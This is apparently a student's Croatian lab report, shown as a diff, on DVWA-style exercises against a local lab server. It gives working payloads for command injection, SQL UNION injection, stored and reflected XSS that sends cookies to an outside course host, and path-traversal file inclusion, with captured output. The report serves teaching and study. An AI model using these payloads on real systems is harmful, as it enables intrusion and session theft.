@@ -1,0 +1,75 @@
+Luka Ilić, 0036514047
+
+3. labos
+
+1) Command Injection
+	-opis: u View Source vidim da nema nikakve provjere za sadržaj $target-a
+	-korištena naredba: 127.0.0.1 | cat /etc/passwd
+	-sadržaj datoteke /etc/passwd:
+		root:x:0:0:root:/root:/bin/bash
+		daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+		bin:x:2:2:bin:/bin:/usr/sbin/nologin
+		sys:x:3:3:sys:/dev:/usr/sbin/nologin
+		sync:x:4:65534:sync:/bin:/bin/sync
+		games:x:5:60:games:/usr/games:/usr/sbin/nologin
+		man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+		lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+		mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+		news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+		uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+		proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+		www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+		backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+		list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+		irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+		gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+		nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+		_apt:x:100:65534::/nonexistent:/bin/false
+		mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
+
+2) SQL Injection
+	-opis: u View Source vidim da tablica koja se vraća kao rezultat iz baze mora imati 2 stupca pa sam u SELECT, osim password, stavio i prezime
+	-korištena naredba: ' UNION SELECT last_name, password FROM users WHERE first_name='Pablo'#
+	-sažetak lozinke: 0d107d09f5bbe40cade3de5c71e9e9b7
+	-lozinka: letmein
+
+3.a) XSS - Cross Site Scripting (Stored)
+	-opis: kod Stored XSS-a input se sprema i izvršava se kada god korisnik učita stranicu s tim spremljenim podacima
+	-korištena naredba: <script>alert(document.cookie)</script>
+	-vrijednost varijable:
+PHPSESSID=4igb6js7kc4h8j4nufblutat17
+
+	-opis: ograničenu duljinu poruke u Message box-u zaobišao sam izmjenom maxlength atributa u html-u stranice
+	-korištena naredba: <script>window.location='http://public.tel.fer.hr/srs?cookie=' + document.cookie</script>
+
+3.b) XSS - Cross Site Scripting (Reflected)
+	-opis: za razliku od Stored XSS, ovdje se unos odmah embedda u odgovor bez prethodne provjere i spremanja
+	-korištena naredba: <script>window.location='http://public.tel.fer.hr/srs?cookie=' + document.cookie</script>
+	-http://192.168.56.101/vulnerabilities/xss_r/?name=%3Cscript%3Ewindow.location=%27http://public.tel.fer.hr/srs?cookie=%27+document.cookie%3C%2Fscript%3E# 
+	vodi na: http://public.tel.fer.hr/srs?cookie=PHPSESSID=4igb6js7kc4h8j4nufblutat17;%20security=low 
+
+4) File Inclusion
+	-opis: u View Source vidim da se dohvaća file naveden u URL-u bez ikakve promjene, te u ?page= upisujem relativnu putanju do etc/passwd sa podosta ../ jer će tako sigurno doći do root foldera
+	-korištena naredba: http://192.168.56.101/vulnerabilities/fi/?page=../../../../../../../../../../../../../etc/passwd
+	-od ovakvog napada zaštitio bih se spremanjem liste dozvoljenih naziva datoteka i njihovih identifiera ili prevencijom da korisnički zahtjevi budu prosljeđivani datotečnom sustavu ili API frameworku web aplikacije, a ako to nije moguće onda sanitizacijom korisničkog unosa
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
